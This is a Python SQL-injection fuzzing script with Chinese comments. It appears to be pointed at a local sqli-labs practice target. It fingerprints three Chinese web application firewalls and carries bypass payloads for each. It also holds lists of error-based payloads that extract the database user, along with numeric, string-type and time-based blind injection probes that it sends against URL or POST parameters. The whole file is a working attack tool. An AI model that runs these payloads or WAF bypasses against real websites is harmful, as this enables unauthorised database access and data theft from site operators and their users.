# 生成注入的payload
import requests
from termcolor import cprint
import random

import re
import time

class Waf:
    def __init__(self):
        self.wafName = {'name': None}

    def detect(self, text):
        aliyun = self.aliyun(text)
        Ddun = self.Ddun(text)
        safeDog = self.safeDog(text)
        if aliyun:
            return {'Flag': 'True', 'wafName': '[阿里云盾]', 'payload': '?x=1 and 1 like 1 分割线 ?x=1 and 1 like 2'}
        elif Ddun:
            return {'Flag': 'True', 'wafName': '[D盾]', 'payload': '?x=1 xor 0 分割线 ?x=1 xor 1'}
        elif safeDog:
            return {'Flag': 'True', 'wafName': '[安全狗]', 'payload': '/*/*//*/*!1 分割线 /*!and/*/**//*!/*!1*/, 注数据：?x=1/*!union/*/**//*!/*!select*/ 1,2,/*!user/*/**//*!/*!()*/'}
        else:
            return {'Flag': 'False'}

    def aliyun(self, text):
        return True if 'https://errors.aliyun.com/images' in text else ''

    def Ddun(self, text):
        return True if '<table width=400 align="center" cellpadding=0 cellspacing=0  style="border: 1px outset #000;">' in text else ''

    def safeDog(self, text):
        return True if 'http://404.safedog.cn' in text else ''

class FuzzFather:
    def __init__(self):
        # 连接字符, 最好不要用or，因为参数值都是真， xor 和 and则可一假一真
        self.Concat = ['and', 'xor']
        # 空格
        self.Space = [' ', '/***/', '%20', '%09', '%0a', '%0b%0c%0b%0d']
        # 单引号，双引号，宽字节+单引号，宽字节+双引号，反斜杠，负数，特殊字符，and，or，xor探测是否存在注入！！！
        self.test = ["'", '"', '%df%27', '%df%22', '\\', '/***/or', '/***/xor', '@', '%', '$', '^', '!', '[']
        # 注释符 '--+', '-- ', '%23'
        self.Notes = [' ', '--+', '%23']
        # 单引号，双引号，括号  quotes:引号 brackets:括号
        self.quotes_brackets = ["'", '"', "\\", "')", '")']

        # digit_bypass可过数字型注入的waf
        # and和or有可能不能使用，或者可以试下&&和||能不能用；还有=不能使用的情况，可以考虑尝试<、>，因为如果不小于又不大于，那边是等于了
        # self.digit_bypass = [['{``1=1}', '{``1=2}'], ['1 like 1', '1 like 2'], ['1', '0'], ['1-0', '1-1'], ['1+0', '1+1'], ['1*0', '1*1'], ['2/1', '0/1'],
        #                 ['2<<1', '0<<2'], ['2>>1', '0<<2'], ['1|1', '0|0'], ['1||1', '0||0'],
        #                 ['1&&1', '0&&1'], ['1^1', '1^0'], ['1%3', '3%3']]

        # 精简版：↓
        # and 1 like 1， and 1 like 2过阿里云waf
        # xor 0，xor 1 过D盾
        # /*!and/*/**//*!/*!1*/  /*!and/*/**//*!/*!0*/ 过安全狗
        self.digit_bypass = [['1', '0'], ['1 like 1', '1 like 2'], ['/*!and/*/**//*!/*!1*/', '/*!and/*/**//*!/*!0*/'],
                             ['{``1=1}', '{``1=2}'], ['1', '0'], ['2<<1', '0<<2'],
                             ['lpad(user(),25,1)', 'lpad(user(),2,1)'],
                             ['1|1', '0|0'], ['1||1', '0||0'],
                             ['1&&1', '0&&1'], ['1^1', '1^0']]

        # 报错payload
        self.error = [
            ' and (select 1 from(select count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x from information_schema.character_sets group by x)a)',
            ' and (select 1 from (select count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))b from information_schema.tables group by b)a)',
            ' union select count(*),1,concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x from information_schema.tables group by x ',
            ' and (updatexml(1,concat(0x5e5e5e,(select user()),0x5e5e5e),1))',
            ' and (extractvalue(1,concat(0x5e5e5e,(select user()),0x5e5e5e)))',
            ' and geometrycollection((select * from(select * from(select user())a)b))',
            ' and multipoint((select * from(select * from(select user())a)b))',
            ' and polygon((select * from(select * from(select user())a)b))',
            ' and multipolygon((select * from(select * from(select user())a)b))',
            ' and linestring((select * from(select * from(select user())a)b))',
            ' and multilinestring((select * from(select * from(select user())a)b))',
            ' and exp(~(select * from(select user())a))'
        ]

        self.num = 0
        self.RedPayloads, self.YellowPayloads, self.BluePayloads, self.GreenPayloads, self.wafPayloads = [], [], [], [], []
        self.ret = {}           # 打印json格式结果
        self.Payloads = []
        self.waf = Waf()

    # 返回请求url的响应包和响应包长度
    def text_length_return(self, url, headers, post_data):
        if post_data:        # POST
            try:
                text = requests.post(url=url, data=post_data, headers=headers).text
                return text, len(text)
            except Exception as e:
                return '', 0            # 返回0说明该次请求失败
        else:               # GET
            try:
                text = requests.get(url=url, headers=headers).text
                return text, len(text)
            except Exception as e:
                return '', 0

    # 返回请求的时间
    def reqTime(self, url, headers, post_data, timeout=5):         # 请求时间
        if post_data:   # POST
            try:
                start_time = time.time()
                requests.post(url=url, data=post_data, headers=headers)
                sleep_time = time.time() - start_time
                if sleep_time >= timeout:
                    return {'success': 'True', 'time': sleep_time}
                else:
                    return {'success': 'Flase', 'time': sleep_time}
            except Exception as e:
                return {'success': 'Flase', 'time': '0'}
        else:
            try:
                start_time = time.time()
                requests.get(url=url)
                # 得返回客户端的时间  假如大于或者等于设置的时间 那就返回true
                sleep_time = time.time() - start_time
                if sleep_time >= timeout:
                    return {'success': 'True', 'time': sleep_time}
                else:
                    return {'success': 'Flase', 'time': sleep_time}
            except Exception as e:
                return {'success': 'Flase', 'time': '0'}


    # 检测是否是注入
    def check(self, standard_length, payload_length1, payload_length2, payload1, payload2, text1, text2, num, func):
        type_inject = ''
        if func == 'test_sql':
            pass
        elif func == 'digit_payload':
            type_inject = '数字型'
        elif func == 'char_payload':
            type_inject = '字符型'
        elif func == 'error_payload':
            type_inject = '报错型'


        waf_exist = self.waf.detect(text=text1)
        # 检测是否触发网站的waf
        if waf_exist['Flag'] == 'True':
            #cprint('[-{}-] {}'.format(num, waf_exist['wafName']), 'red')
            self.ret['success'] = 'Maybe'
            self.ret['type'] = type_inject
            self.ret['payload'] = waf_exist['payload']
            self.ret['waf'] = waf_exist['wafName']
            cprint(self.ret, 'red')
            self.Payloads.append(self.ret)

        elif '^^^' in text1:
            cmp = '[\^][\^][\^](.*)[\^][\^][\^]'  # ^是元字符，所以要在方括号里并用斜杠去匹配^
            user = re.search(cmp, text1).group(1)
            self.ret['success'] = 'True'
            self.ret['type'] = type_inject
            self.ret['payload'] = payload1
            self.ret['user'] = user
            self.ret['waf'] = 'None'
            cprint(self.ret, 'red')
            self.Payloads.append(self.ret)

        # 无论用and还是xor，如果是结果页面不同的注入点，那么payload1和payload2肯定不同，且其中一个同standard_length相同。
        elif (standard_length == payload_length1 and payload_length1 != payload_length2) or (standard_length == payload_length2 and payload_length1 != payload_length2):
            #out_ret = '[+{}+] {}注入  [{}] payload : [{}]'.format(num, type_inject, payload_length1, payload1)
            self.ret['success'] = 'True'
            self.ret['type'] = type_inject
            self.ret['payload'] = payload1 + '-----' + payload2
            self.ret['waf'] = 'None'
            cprint(self.ret, 'red')
            self.Payloads.append(self.ret)
        elif 'SQL syntax' in text1 or 'SQL syntax' in text2:
            #out_ret = '[+{}+] SQL syntax  [{}] payload : [{}]'.format(num, payload_length1, payload1)
            self.ret['success'] = 'True'
            self.ret['type'] = 'SQL syntax'
            self.ret['payload'] = payload1 + '-----' + payload2
            self.ret['waf'] = 'None'
            cprint(self.ret, "yellow")
            self.Payloads.append(self.ret)
        elif 'Warning' in text1 or 'Warning' in text2:
            #out_ret = '[+{}+] Warning  [{}] payload : [{}]'.format(num, payload_length1, payload1)
            self.ret['success'] = 'True'
            self.ret['type'] = 'Warning'
            self.ret['payload'] = payload1 + '-----' + payload2
            self.ret['waf'] = 'None'
            cprint(self.ret, "yellow")
            self.Payloads.append(self.ret)
        elif 'mysql_error' in text1 or 'mysql_error' in text2:
            #out_ret = '[+{}+] mysql_error  [{}] payload : [{}]'.format(num, payload_length1, payload1)
            self.ret['success'] = 'True'
            self.ret['type'] = 'mysql_error'
            self.ret['payload'] = payload1 + '-----' + payload2
            self.ret['waf'] = 'None'
            cprint(self.ret, "yellow")
            self.Payloads.append(self.ret)
        # 为了过滤无论逻辑真假，页面都不变的注入点, 因为如果都不变，则payload_length1等于payload_length2。例如第一关
        elif standard_length != payload_length1 and payload_length1 == payload_length2:
            #out_ret = '[${}$] 可能存在{}注入  [{}] payload : [{}]'.format(num, type_inject, payload_length1, payload1)
            self.ret['success'] = 'Maybe'
            self.ret['type'] = type_inject
            self.ret['payload'] = payload1 + '-----' + payload2
            self.ret['waf'] = 'None'
            cprint(self.ret, "blue")
            self.Payloads.append(self.ret)
        # standard_length, payload_length1, payload_length2都相等
        else:
            pass
            #out_ret = '[-{}-] 不是{}注入。'.format(num, type_inject)
            # cprint(out_ret, 'green')
            #self.GreenPayloads.append(out_ret)
        self.ret = {}

    # 第一功能探测是否存在注入：单引号，双引号，反斜杠，负数，特殊字符，and，or，xor！！！
    def test_sql(self, url, params, headers, standard_length, type):
        '''
        :param url: 请求的路径,GET型有参数，POST型无参数
        :param params: 是POST型参数
        :param headers: 请求头
        :param standard_length: 正常包的响应包长度
        :param type: GET/POST
        :return:
        '''
        #cprint('检测是否存在注入：↓', 'red')
        paramsList = params.split('&')
        for i in range(len(paramsList)):
            for each_test in self.test:
                payload_param = paramsList[i] + each_test  # 构造其中一个参数的payload
                print(each_test)
                if type == 'get':  # GET
                    payload = url.replace(paramsList[i], payload_param)  # 构造好的参数payload替换掉原先的参数
                    text, payload_length = self.text_length_return(url=payload, headers=headers, post_data=None)  # payload_length1是请求带payload的响应包的长度
                else:           # POST
                    payload = params.replace(paramsList[i], payload_param)  # 构造好的参数payload替换掉原先的参数
                    text, payload_length = self.text_length_return(url=url, headers=headers, post_data=payload)  # payload_length1是请求带payload的响应包的长度
                #print('[:{}:] 测试 : [{}] {}'.format(self.num, payload_length, payload))



                self.num += 1

    # 第二功能：请求数字型payload
    def digit_payload(self, url, params, headers, standard_length, type):
        '''
            因为是判断数字型，所以不需要注释符。
        '''
        #cprint('检测是否存在数字型注入：↓', 'red')
        paramsList = params.split('&')
        for i in range(len(paramsList)):
            for each_pass in self.digit_bypass:
                # 随机抽取空格字符的一个字符和连接字符的一个字符
                # 为了减少测试语句数量，这里从列表里随机抽取
                space = random.choice(self.Space)
                concat = random.choice(self.Concat)
                # demo http://lrzdjx.com/sqltest.php?x=1 and {``1=1}
                #      http://lrzdjx.com/sqltest.php?x=1 and {``1=2}
                SpaceConcatSpace = space + concat + space       # 空格+连接字符+空格
                print('{}{}'.format(SpaceConcatSpace, each_pass[0]))
                print('{}{}'.format(SpaceConcatSpace, each_pass[1]))

                payload1_param = paramsList[i] + '{}{}'.format(SpaceConcatSpace, each_pass[0])  # 构造其中一个参数的payload
                payload2_param = paramsList[i] + '{}{}'.format(SpaceConcatSpace, each_pass[1])

                if type == 'get':  # GET
                    payload1 = url.replace(paramsList[i], payload1_param)  # 构造好的参数payload替换掉原先的参数
                    payload2 = url.replace(paramsList[i], payload2_param)
                    text1, payload_length1 = self.text_length_return(url=payload1, headers=headers, post_data=None)  # payload_length1是请求带payload的响应包的长度
                    text2, payload_length2 = self.text_length_return(url=payload2, headers=headers, post_data=None)
                else:  # POST
                    payload1 = params.replace(paramsList[i], payload1_param)
                    payload2 = params.replace(paramsList[i], payload2_param)
                    text1, payload_length1 = self.text_length_return(url=url, headers=headers, post_data=payload1)  # payload_length1是请求带payload的响应包的长度
                    text2, payload_length2 = self.text_length_return(url=url, headers=headers, post_data=payload2)  # payload_length1是请求带payload的响应包的长度

                # print('[:{}:] 测试 : [{}] {}'.format(self.num, payload_length1, payload1))
                # print('[:{}:] 测试 : [{}] {}'.format(self.num, payload_length2, payload2))


                self.num += 1

    # 第三功能：请求字符型payload
    def char_payload(self, url, params, headers, standard_length, type):
        '''
            因为是判断字符型，所以需要注释符。
        '''
        #cprint('检测是否存在字符型注入：↓', 'red')
        paramsList = params.split('&')
        for i in range(len(paramsList)):
            for quote in self.quotes_brackets:
                for each_digit in self.digit_bypass:
                    # ['{``1=1}', '{``1=2}']
                    # 随机抽取空格字符的一个字符和连接字符的一个字符
                    # 为了减少测试语句数量，这里从列表里随机抽取
                    space = random.choice(self.Space)
                    concat = random.choice(self.Concat)
                    note = random.choice(self.Notes)
                    # demo: ' and {``1=1}--+
                    #       ' and {``1=2}--+
                    spaceAndspace1 = '{}{}{}{}{}{}'.format(quote, space, concat, space, each_digit[0], note)
                    spaceAndspace2 = '{}{}{}{}{}{}'.format(quote, space, concat, space, each_digit[1], note)
                    print(spaceAndspace1)
                    print(spaceAndspace2)
                    payload1_param = paramsList[i] + "{}".format(spaceAndspace1)
                    payload2_param = paramsList[i] + "{}".format(spaceAndspace2)

                    if type == 'get':  # GET
                        payload1 = url.replace(paramsList[i], payload1_param)
                        payload2 = url.replace(paramsList[i], payload2_param)
                        text1, payload_length1 = self.text_length_return(url=payload1, headers=headers, post_data=None)  # payload_length1是请求带payload的响应包的长度
                        text2, payload_length2 = self.text_length_return(url=payload2, headers=headers, post_data=None)
                    else:  # POST
                        payload1 = params.replace(paramsList[i], payload1_param)
                        payload2 = params.replace(paramsList[i], payload2_param)
                        text1, payload_length1 = self.text_length_return(url=url, headers=headers,
                                                                         post_data=payload1)  # payload_length1是请求带payload的响应包的长度
                        text2, payload_length2 = self.text_length_return(url=url, headers=headers,
                                                                         post_data=payload2)  # payload_length1是请求带payload的响应包的长度

                    # print('[:{}:] 测试 : [{}] {}'.format(self.num, payload_length1, payload1))
                    # print('[:{}:] 测试 : [{}] {}'.format(self.num, payload_length2, payload2))




                    self.num += 1

    # 第四功能：请求报错payload
    def error_payload(self, url, params, headers, standard_length, type):
        #cprint('检测报错型注入：↓', 'red')
        paramsList = params.split('&')
        for i in range(len(paramsList)):
            for each in ['', '"', "'"]:
                for each_error in self.error:
                    note = random.choice(['--+', '%23'])
                    print('{}{}{}'.format(each, each_error, note))
                    payload_param = paramsList[i] + '{}{}{}'.format(each, each_error, note)  # 构造其中一个参数的payload
                    if type == 'get':  # GET
                        payload = url.replace(paramsList[i], payload_param)  # 构造好的参数payload替换掉原先的参数
                        text, payload_length = self.text_length_return(url=payload, headers=headers,
                                                                       post_data=None)  # payload_length1是请求带payload的响应包的长度

                    else:  # POST
                        payload = params.replace(paramsList[i], payload_param)  # 构造好的参数payload替换掉原先的参数
                        text, payload_length = self.text_length_return(url=url, headers=headers,
                                                                       post_data=payload)  # payload_length1是请求带payload的响应包的长度
                    #print('[:{}:] 测试 : [{}] {}'.format(self.num, payload_length, payload))


                    self.num += 1

    def blind_payload(self, url, params, headers, standard_length, type):
        #cprint('检测时间型盲注：↓', 'red')
        paramsList = params.split('&')
        for i in range(len(paramsList)):
            for each in ['', '"', "'"]:
                note = random.choice(['--+', '%23'])
                j = 1
                while j < 15:
                    payload_param = paramsList[i] + "{} and sleep( if( (select length(database()) = {}) , 500, 0 ) ){}".format(each,j,note)  # 长度payload
                    print(payload_param)
                    if type == 'get':  # GET
                        payload = url.replace(paramsList[i], payload_param)  # 构造好的参数payload替换掉原先的参数
                        blind_flag = self.reqTime(url=payload, headers=headers, post_data=None)
                    else:  # POST
                        payload = params.replace(paramsList[i], payload_param)  # 构造好的参数payload替换掉原先的参数
                        blind_flag = self.reqTime(url=url, headers=headers, post_data=payload)
                    # print('[{}] 测试 ：{} [{}]'.format(j, payload, blind_flag['time']))
                    # if blind_flag['success'] == 'True':
                    #     cprint('[+]延时注入！ database() 的长度为： {}'.format(j), 'red')
                    #     self.ret['success'] = 'True'
                    #     self.ret['type'] = '盲注'
                    #     self.ret['payload'] = payload
                    #     self.ret['waf'] = 'None'
                    #     self.Payloads.append(self.ret)
                    #     break
                    j = j + 1


url = 'http://127.0.0.1/sqli/Less-1/?id=1'
params = ''
headers = {'cookie': None}
standard_length = 111
type = 'get'
FuzzFather().test_sql(url, params, headers, standard_length, type)
FuzzFather().digit_payload(url, params, headers, standard_length, type)
FuzzFather().char_payload(url, params, headers, standard_length, type)
FuzzFather().error_payload(url, params, headers, standard_length, type)
FuzzFather().blind_payload(url, params, headers, standard_length, type)